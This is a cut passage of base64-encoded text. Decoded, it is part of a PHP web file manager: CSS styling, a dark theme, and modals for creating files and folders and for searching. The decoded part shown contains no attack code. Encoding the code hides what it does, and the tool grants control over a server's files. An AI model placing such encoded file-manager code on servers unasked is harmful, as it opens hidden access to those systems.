UEJJbVRZNWdqRUw5RE0rd1RFTnVRYWhBdkVPOURNd2lHZHdBeE95bUdKUUx4VHlEK2pnV0R4Q01aUnNFb0dBVm9BQURlZW13dFBjWkkyd0FBQUFCSlJVNUVya0pnZ2c9PScpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICB0YWJsZS5kYXRhVGFibGUgdGhlYWQgLnNvcnRpbmdfZGVzYyB7DQogICAgICAgICAgICAgICAgY3Vyc29yOiBwb2ludGVyOw0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQtcmVwZWF0OiBuby1yZXBlYXQ7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZC1wb3NpdGlvbjogY2VudGVyIHJpZ2h0Ow0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IHVybCgnZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFCTUFBQUFUQ0FZQUFBQnlVRGJNQUFBQVpVbEVRVlE0eTJOZ0dBV2pZQlNnZ2FxR3U1RkEvQk9JdjJQQklQRkVVZ3hqQitJZFFQd2ZDOTRIeEx5a3VzNEdpRCtoR2ZRT2lCM0o4U29qRUU5RU0yd3VTSnpjc0ZNRzR0dFFneDREc1JhbGtaRU54TCtBdUpRYU1jc0d4Qk9BbUd2b3BrOEFWejFzTFpnZzBic0FBQUFBU1VWT1JLNUNZSUk9Jyk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHRhYmxlLmRhdGFUYWJsZSB0aGVhZCB0cjpmaXJzdC1jaGlsZCB0aC5jdXN0b20tY2hlY2tib3gtaGVhZGVyOmZpcnN0LWNoaWxkIHsNCiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kLWltYWdlOiBub25lOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuZm9vdGVyLWFjdGlvbiBsaSB7DQogICAgICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLmFwcC12LXRpdGxlIHsNCiAgICAgICAgICAgICAgICBmb250LXNpemU6IDI0cHg7DQogICAgICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDMwMDsNCiAgICAgICAgICAgICAgICBsZXR0ZXItc3BhY2luZzogLS41cHg7DQogICAgICAgICAgICAgICAgdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgaHIuY3VzdG9tLWhyIHsNCiAgICAgICAgICAgICAgICBib3JkZXItdG9wOiAxcHggZGFzaGVkICM4YzhiOGI7DQogICAgICAgICAgICAgICAgYm9yZGVyLWJvdHRvbTogMXB4IGRhc2hlZCAjZmZmOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAjc25hY2tiYXIgew0KICAgICAgICAgICAgICAgIHZpc2liaWxpdHk6IGhpZGRlbjsNCiAgICAgICAgICAgICAgICBtaW4td2lkdGg6IDI1MHB4Ow0KICAgICAgICAgICAgICAgIG1hcmdpbi1sZWZ0OiAtMTI1cHg7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzMzMzsNCiAgICAgICAgICAgICAgICBjb2xvcjogI2ZmZjsNCiAgICAgICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogICAgICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogMnB4Ow0KICAgICAgICAgICAgICAgIHBhZGRpbmc6IDE2cHg7DQogICAgICAgICAgICAgICAgcG9zaXRpb246IGZpeGVkOw0KICAgICAgICAgICAgICAgIHotaW5kZXg6IDE7DQogICAgICAgICAgICAgICAgbGVmdDogNTAlOw0KICAgICAgICAgICAgICAgIGJvdHRvbTogMzBweDsNCiAgICAgICAgICAgICAgICBmb250LXNpemU6IDE3cHg7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICNzbmFja2Jhci5zaG93IHsNCiAgICAgICAgICAgICAgICB2aXNpYmlsaXR5OiB2aXNpYmxlOw0KICAgICAgICAgICAgICAgIC13ZWJraXQtYW5pbWF0aW9uOiBmYWRlaW4gMC41cywgZmFkZW91dCAwLjVzIDIuNXM7DQogICAgICAgICAgICAgICAgYW5pbWF0aW9uOiBmYWRlaW4gMC41cywgZmFkZW91dCAwLjVzIDIuNXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIEAtd2Via2l0LWtleWZyYW1lcyBmYWRlaW4gew0KICAgICAgICAgICAgICAgIGZyb20gew0KICAgICAgICAgICAgICAgICAgICBib3R0b206IDA7DQogICAgICAgICAgICAgICAgICAgIG9wYWNpdHk6IDA7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgdG8gew0KICAgICAgICAgICAgICAgICAgICBib3R0b206IDMwcHg7DQogICAgICAgICAgICAgICAgICAgIG9wYWNpdHk6IDE7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBAa2V5ZnJhbWVzIGZhZGVpbiB7DQogICAgICAgICAgICAgICAgZnJvbSB7DQogICAgICAgICAgICAgICAgICAgIGJvdHRvbTogMDsNCiAgICAgICAgICAgICAgICAgICAgb3BhY2l0eTogMDsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICB0byB7DQogICAgICAgICAgICAgICAgICAgIGJvdHRvbTogMzBweDsNCiAgICAgICAgICAgICAgICAgICAgb3BhY2l0eTogMTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIEAtd2Via2l0LWtleWZyYW1lcyBmYWRlb3V0IHsNCiAgICAgICAgICAgICAgICBmcm9tIHsNCiAgICAgICAgICAgICAgICAgICAgYm90dG9tOiAzMHB4Ow0KICAgICAgICAgICAgICAgICAgICBvcGFjaXR5OiAxOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIHRvIHsNCiAgICAgICAgICAgICAgICAgICAgYm90dG9tOiAwOw0KICAgICAgICAgICAgICAgICAgICBvcGFjaXR5OiAwOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgQGtleWZyYW1lcyBmYWRlb3V0IHsNCiAgICAgICAgICAgICAgICBmcm9tIHsNCiAgICAgICAgICAgICAgICAgICAgYm90dG9tOiAzMHB4Ow0KICAgICAgICAgICAgICAgICAgICBvcGFjaXR5OiAxOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIHRvIHsNCiAgICAgICAgICAgICAgICAgICAgYm90dG9tOiAwOw0KICAgICAgICAgICAgICAgICAgICBvcGFjaXR5OiAwOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgI21haW4tdGFibGUgc3Bhbi5iYWRnZSB7DQogICAgICAgICAgICAgICAgYm9yZGVyLWJvdHRvbTogMnB4IHNvbGlkICNmOGY5ZmENCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgI21haW4tdGFibGUgc3Bhbi5iYWRnZTpudGgtY2hpbGQoMSkgew0KICAgICAgICAgICAgICAgIGJvcmRlci1jb2xvcjogI2RmNDIyNw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAjbWFpbi10YWJsZSBzcGFuLmJhZGdlOm50aC1jaGlsZCgyKSB7DQogICAgICAgICAgICAgICAgYm9yZGVyLWNvbG9yOiAjZjhiNjAwDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICNtYWluLXRhYmxlIHNwYW4uYmFkZ2U6bnRoLWNoaWxkKDMpIHsNCiAgICAgICAgICAgICAgICBib3JkZXItY29sb3I6ICMwMGJkNjANCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgI21haW4tdGFibGUgc3Bhbi5iYWRnZTpudGgtY2hpbGQoNCkgew0KICAgICAgICAgICAgICAgIGJvcmRlci1jb2xvcjogIzQ1ODFmZg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAjbWFpbi10YWJsZSBzcGFuLmJhZGdlOm50aC1jaGlsZCg1KSB7DQogICAgICAgICAgICAgICAgYm9yZGVyLWNvbG9yOiAjYWM2OGZjDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICNtYWluLXRhYmxlIHNwYW4uYmFkZ2U6bnRoLWNoaWxkKDYpIHsNCiAgICAgICAgICAgICAgICBib3JkZXItY29sb3I6ICM0NWMzZDINCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgQG1lZGlhIG9ubHkgc2NyZWVuIGFuZCAobWluLWRldmljZS13aWR0aDo3NjhweCkgYW5kIChtYXgtZGV2aWNlLXdpZHRoOjEwMjRweCkgYW5kIChvcmllbnRhdGlvbjpsYW5kc2NhcGUpIGFuZCAoLXdlYmtpdC1taW4tZGV2aWNlLXBpeGVsLXJhdGlvOjIpIHsNCiAgICAgICAgICAgICAgICAubmF2YmFyLWNvbGxhcHNlIC5jb2wteHMtNiB7DQogICAgICAgICAgICAgICAgICAgIHBhZGRpbmc6IDA7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuYnRuLmFjdGl2ZS5mb2N1cywNCiAgICAgICAgICAgIC5idG4uYWN0aXZlOmZvY3VzLA0KICAgICAgICAgICAgLmJ0bi5mb2N1cywNCiAgICAgICAgICAgIC5idG4uZm9jdXM6YWN0aXZlLA0KICAgICAgICAgICAgLmJ0bjphY3RpdmU6Zm9jdXMsDQogICAgICAgICAgICAuYnRuOmZvY3VzIHsNCiAgICAgICAgICAgICAgICBvdXRsaW5lOiAwICFpbXBvcnRhbnQ7DQogICAgICAgICAgICAgICAgb3V0bGluZS1vZmZzZXQ6IDAgIWltcG9ydGFudDsNCiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kLWltYWdlOiBub25lICFpbXBvcnRhbnQ7DQogICAgICAgICAgICAgICAgLXdlYmtpdC1ib3gtc2hhZG93OiBub25lICFpbXBvcnRhbnQ7DQogICAgICAgICAgICAgICAgYm94LXNoYWRvdzogbm9uZSAhaW1wb3J0YW50DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5sZHMtZmFjZWJvb2sgew0KICAgICAgICAgICAgICAgIGRpc3BsYXk6IG5vbmU7DQogICAgICAgICAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlOw0KICAgICAgICAgICAgICAgIHdpZHRoOiA2NHB4Ow0KICAgICAgICAgICAgICAgIGhlaWdodDogNjRweA0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAubGRzLWZhY2Vib29rIGRpdiwNCiAgICAgICAgICAgIC5sZHMtZmFjZWJvb2suc2hvdy1tZSB7DQogICAgICAgICAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5sZHMtZmFjZWJvb2sgZGl2IHsNCiAgICAgICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQogICAgICAgICAgICAgICAgbGVmdDogNnB4Ow0KICAgICAgICAgICAgICAgIHdpZHRoOiAxM3B4Ow0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6ICMwMDdiZmY7DQogICAgICAgICAgICAgICAgYW5pbWF0aW9uOiBsZHMtZmFjZWJvb2sgMS4ycyBjdWJpYy1iZXppZXIoMCwgLjUsIC41LCAxKSBpbmZpbml0ZQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAubGRzLWZhY2Vib29rIGRpdjpudGgtY2hpbGQoMSkgew0KICAgICAgICAgICAgICAgIGxlZnQ6IDZweDsNCiAgICAgICAgICAgICAgICBhbmltYXRpb24tZGVsYXk6IC0uMjRzDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5sZHMtZmFjZWJvb2sgZGl2Om50aC1jaGlsZCgyKSB7DQogICAgICAgICAgICAgICAgbGVmdDogMjZweDsNCiAgICAgICAgICAgICAgICBhbmltYXRpb24tZGVsYXk6IC0uMTJzDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5sZHMtZmFjZWJvb2sgZGl2Om50aC1jaGlsZCgzKSB7DQogICAgICAgICAgICAgICAgbGVmdDogNDVweDsNCiAgICAgICAgICAgICAgICBhbmltYXRpb24tZGVsYXk6IDBzDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIEBrZXlmcmFtZXMgbGRzLWZhY2Vib29rIHsNCiAgICAgICAgICAgICAgICAwJSB7DQogICAgICAgICAgICAgICAgICAgIHRvcDogNnB4Ow0KICAgICAgICAgICAgICAgICAgICBoZWlnaHQ6IDUxcHgNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAxMDAlLA0KICAgICAgICAgICAgICAgIDUwJSB7DQogICAgICAgICAgICAgICAgICAgIHRvcDogMTlweDsNCiAgICAgICAgICAgICAgICAgICAgaGVpZ2h0OiAyNnB4DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICB1bCNzZWFyY2gtd3JhcHBlciB7DQogICAgICAgICAgICAgICAgcGFkZGluZy1sZWZ0OiAwOw0KICAgICAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICNlY2VjZWNjYzsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgdWwjc2VhcmNoLXdyYXBwZXIgbGkgew0KICAgICAgICAgICAgICAgIGxpc3Qtc3R5bGU6IG5vbmU7DQogICAgICAgICAgICAgICAgcGFkZGluZzogNXB4Ow0KICAgICAgICAgICAgICAgIGJvcmRlci1ib3R0b206IDFweCBzb2xpZCAjZWNlY2VjY2M7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHVsI3NlYXJjaC13cmFwcGVyIGxpOm50aC1jaGlsZChvZGQpIHsNCiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiAjZjlmOWY5Y2M7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5jLXByZXZpZXctaW1nIHsNCiAgICAgICAgICAgICAgICBtYXgtd2lkdGg6IDMwMHB4Ow0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuYm9yZGVyLXJhZGl1cy0wIHsNCiAgICAgICAgICAgICAgICBib3JkZXItcmFkaXVzOiAwOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuZmxvYXQtcmlnaHQgew0KICAgICAgICAgICAgICAgIGZsb2F0OiByaWdodDsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLnRhYmxlLWhvdmVyPnRib2R5PnRyOmhvdmVyPnRkOmZpcnN0LWNoaWxkIHsNCiAgICAgICAgICAgICAgICBib3JkZXItbGVmdDogMXB4IHNvbGlkICMxYjc3ZmQ7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICNtYWluLXRhYmxlIHRyLmV2ZW4gew0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNGOEY5RmE7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC5maWxlbmFtZT5hPmkgew0KICAgICAgICAgICAgICAgIG1hcmdpbi1yaWdodDogM3B4Ow0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuZnMtNyB7DQogICAgICAgICAgICAgICAgZm9udC1zaXplOiAxNHB4Ow0KICAgICAgICAgICAgfQ0KICAgICAgICA8L3N0eWxlPg0KICAgICAgICA8P3BocA0KICAgICAgICBpZiAoRk1fVEhFTUUgPT0gImRhcmsiKTogPz4NCiAgICAgICAgICAgIDxzdHlsZT4NCiAgICAgICAgICAgICAgICA6cm9vdCB7DQogICAgICAgICAgICAgICAgICAgIC0tYnMtYmctb3BhY2l0eTogMTsNCiAgICAgICAgICAgICAgICAgICAgLS1iZy1jb2xvcjogI2YzZGFhNjsNCiAgICAgICAgICAgICAgICAgICAgLS1icy1kYXJrLXJnYjogMjgsIDM2LCA0MSAhaW1wb3J0YW50Ow0KICAgICAgICAgICAgICAgICAgICAtLWJzLWJnLW9wYWNpdHk6IDE7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgYm9keS50aGVtZS1kYXJrIHsNCiAgICAgICAgICAgICAgICAgICAgYmFja2dyb3VuZC1pbWFnZTogbGluZWFyLWdyYWRpZW50KDkwZGVnLCAjMWMyNDI5LCAjMjYzMjM4KTsNCiAgICAgICAgICAgICAgICAgICAgY29sb3I6ICNDRkQ4REM7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgLmxpc3QtZ3JvdXAgLmxpc3QtZ3JvdXAtaXRlbSB7DQogICAgICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6ICMzNDNhNDA7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgLnRoZW1lLWRhcmsgLm5hdmJhci1uYXYgaSwNCiAgICAgICAgICAgICAgICAubmF2YmFyLW5hdiAuZHJvcGRvd24tdG9nZ2xlLA0KICAgICAgICAgICAgICAgIC5icmVhay13b3JkIHsNCiAgICAgICAgICAgICAgICAgICAgY29sb3I6ICNDRkQ4REM7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgYSwNCiAgICAgICAgICAgICAgICBhOmhvdmVyLA0KICAgICAgICAgICAgICAgIGE6dmlzaXRlZCwNCiAgICAgICAgICAgICAgICBhOmFjdGl2ZSwNCiAgICAgICAgICAgICAgICAjbWFpbi10YWJsZSAuZmlsZW5hbWUgYSwNCiAgICAgICAgICAgICAgICBpLmZhLmZhLWZvbGRlci1vLA0KICAgICAgICAgICAgICAgIGkuZ28tYmFjayB7DQogICAgICAgICAgICAgICAgICAgIGNvbG9yOiB2YXIoLS1iZy1jb2xvcik7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgdWwjc2VhcmNoLXdyYXBwZXIgbGk6bnRoLWNoaWxkKG9kZCkgew0KICAgICAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMjEyYTJmOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIC50aGVtZS1kYXJrIC5idG4tb3V0bGluZS1wcmltYXJ5IHsNCiAgICAgICAgICAgICAgICAgICAgY29sb3I6ICNiOGU1OWM7DQogICAgICAgICAgICAgICAgICAgIGJvcmRlci1jb2xvcjogI2I4ZTU5YzsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAudGhlbWUtZGFyayAuYnRuLW91dGxpbmUtcHJpbWFyeTpob3ZlciwNCiAgICAgICAgICAgICAgICAudGhlbWUtZGFyayAuYnRuLW91dGxpbmUtcHJpbWFyeTphY3RpdmUgew0KICAgICAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMmQ0MTIxOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIC50aGVtZS1kYXJrIGlucHV0LmZvcm0tY29udHJvbCB7DQogICAgICAgICAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMxMDE1MTg7DQogICAgICAgICAgICAgICAgICAgIGNvbG9yOiAjQ0ZEOERDOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIC50aGVtZS1kYXJrIC5kcm9wem9uZSB7DQogICAgICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6IHRyYW5zcGFyZW50Ow0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIC50aGVtZS1kYXJrIC5pbmxpbmUtYWN0aW9ucz5hPmkgew0KICAgICAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiAjNzk3NTVlOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIC50aGVtZS1kYXJrIC50ZXh0LXdoaXRlIHsNCiAgICAgICAgICAgICAgICAgICAgY29sb3I6ICNDRkQ4REMgIWltcG9ydGFudDsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAudGhlbWUtZGFyayAudGFibGUtYm9yZGVyZWQgdGQsDQogICAgICAgICAgICAgICAgLnRhYmxlLWJvcmRlcmVkIHRoIHsNCiAgICAgICAgICAgICAgICAgICAgYm9yZGVyLWNvbG9yOiAjMzQzNDM0Ow0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIC50aGVtZS1kYXJrIC50YWJsZS1ib3JkZXJlZCB0ZCAuY3VzdG9tLWNvbnRyb2wtaW5wdXQsDQogICAgICAgICAgICAgICAgLnRoZW1lLWRhcmsgLnRhYmxlLWJvcmRlcmVkIHRoIC5jdXN0b20tY29udHJvbC1pbnB1dCB7DQogICAgICAgICAgICAgICAgICAgIG9wYWNpdHk6IDAuNjc4Ow0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIC5tZXNzYWdlIHsNCiAgICAgICAgICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzIxMjUyOTsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICBmb3JtLmRyb3B6b25lIHsNCiAgICAgICAgICAgICAgICAgICAgYm9yZGVyLWNvbG9yOiAjNzk3NTVlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIDwvc3R5bGU+DQogICAgICAgIDw/cGhwIGVuZGlmOyA/Pg0KICAgIDwvaGVhZD4NCg0KICAgIDxib2R5IGNsYXNzPSI8P3BocCBlY2hvIChGTV9USEVNRSA9PSAiZGFyayIpID8gJ3RoZW1lLWRhcmsnIDogJyc7ID8+IDw/cGhwIGVjaG8gJGlzU3RpY2t5TmF2QmFyOyA/PiI+DQogICAgICAgIDxkaXYgaWQ9IndyYXBwZXIiIGNsYXNzPSJjb250YWluZXItZmx1aWQiPg0KICAgICAgICAgICAgPCEtLSBOZXcgSXRlbSBjcmVhdGlvbiAtLT4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsIGZhZGUiIGlkPSJjcmVhdGVOZXdJdGVtIiB0YWJpbmRleD0iLTEiIHJvbGU9ImRpYWxvZyIgZGF0YS1icy1iYWNrZHJvcD0ic3RhdGljIiBkYXRhLWJzLWtleWJvYXJkPSJmYWxzZSIgYXJpYS1sYWJlbGxlZGJ5PSJuZXdJdGVtTW9kYWxMYWJlbCIgYXJpYS1oaWRkZW49InRydWUiIGRhdGEtYnMtdGhlbWU9Ijw/cGhwIGVjaG8gRk1fVEhFTUU7ID8+Ij4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1kaWFsb2ciIHJvbGU9ImRvY3VtZW50Ij4NCiAgICAgICAgICAgICAgICAgICAgPGZvcm0gY2xhc3M9Im1vZGFsLWNvbnRlbnQiIG1ldGhvZD0icG9zdCI+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1oZWFkZXIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxoNSBjbGFzcz0ibW9kYWwtdGl0bGUiIGlkPSJuZXdJdGVtTW9kYWxMYWJlbCI+PGkgY2xhc3M9ImZhIGZhLXBsdXMtc3F1YXJlIGZhLWZ3Ij48L2k+PD9waHAgZWNobyBsbmcoJ0NyZWF0ZU5ld0l0ZW0nKSA/PjwvaDU+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJidG4tY2xvc2UiIGRhdGEtYnMtZGlzbWlzcz0ibW9kYWwiIGFyaWEtbGFiZWw9IkNsb3NlIj48L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtYm9keSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHA+PGxhYmVsIGZvcj0ibmV3ZmlsZSI+PD9waHAgZWNobyBsbmcoJ0l0ZW1UeXBlJykgPz4gPC9sYWJlbD48L3A+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1jaGVjayBmb3JtLWNoZWNrLWlubGluZSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iZm9ybS1jaGVjay1pbnB1dCIgdHlwZT0icmFkaW8iIG5hbWU9Im5ld2ZpbGUiIGlkPSJjdXN0b21SYWRpb0lubGluZTEiIG5hbWU9Im5ld2ZpbGUiIHZhbHVlPSJmaWxlIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJmb3JtLWNoZWNrLWxhYmVsIiBmb3I9ImN1c3RvbVJhZGlvSW5saW5lMSI+PD9waHAgZWNobyBsbmcoJ0ZpbGUnKSA/PjwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1jaGVjayBmb3JtLWNoZWNrLWlubGluZSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iZm9ybS1jaGVjay1pbnB1dCIgdHlwZT0icmFkaW8iIG5hbWU9Im5ld2ZpbGUiIGlkPSJjdXN0b21SYWRpb0lubGluZTIiIHZhbHVlPSJmb2xkZXIiIGNoZWNrZWQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iZm9ybS1jaGVjay1sYWJlbCIgZm9yPSJjdXN0b21SYWRpb0lubGluZTIiPjw/cGhwIGVjaG8gbG5nKCdGb2xkZXInKSA/PjwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cCBjbGFzcz0ibXQtMyI+PGxhYmVsIGZvcj0ibmV3ZmlsZW5hbWUiPjw/cGhwIGVjaG8gbG5nKCdJdGVtTmFtZScpID8+IDwvbGFiZWw+PC9wPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJuZXdmaWxlbmFtZSIgaWQ9Im5ld2ZpbGVuYW1lIiB2YWx1ZT0iIiBjbGFzcz0iZm9ybS1jb250cm9sIiBwbGFjZWhvbGRlcj0iPD9waHAgZWNobyBsbmcoJ0VudGVyIGhlcmUuLi4nKSA/PiIgcmVxdWlyZWQ+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWZvb3RlciI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idG9rZW4iIHZhbHVlPSI8P3BocCBlY2hvICRfU0VTU0lPTlsndG9rZW4nXTsgPz4iPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lLXByaW1hcnkiIGRhdGEtYnMtZGlzbWlzcz0ibW9kYWwiPjxpIGNsYXNzPSJmYSBmYS10aW1lcy1jaXJjbGUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ0NhbmNlbCcpID8+PC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXN1Y2Nlc3MiPjxpIGNsYXNzPSJmYSBmYS1jaGVjay1jaXJjbGUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ0NyZWF0ZU5vdycpID8+PC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9mb3JtPg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQoNCiAgICAgICAgICAgIDwhLS0gQWR2YW5jZSBTZWFyY2ggTW9kYWwgLS0+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbCBmYWRlIiBpZD0ic2VhcmNoTW9kYWwiIHRhYmluZGV4PSItMSIgcm9sZT0iZGlhbG9nIiBhcmlhLWxhYmVsbGVkYnk9InNlYXJjaE1vZGFsTGFiZWwiIGFyaWEtaGlkZGVuPSJ0cnVlIiBkYXRhLWJzLXRoZW1lPSI8P3BocCBlY2hvIEZNX1RIRU1FOyA/PiI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtZGlhbG9nIG1vZGFsLWxnIiByb2xlPSJkb2N1bWVudCI+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWNvbnRlbnQiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtaGVhZGVyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aDUgY2xhc3M9Im1vZGFsLXRpdGxlIGNvbC0xMCIgaWQ9InNlYXJjaE1vZGFsTGFiZWwiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cCBtYi0zIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZm9ybS1jb250cm9sIiBwbGFjZWhvbGRlcj0iPD9waHAgZWNobyBsbmcoJ1NlYXJjaCcpID8+I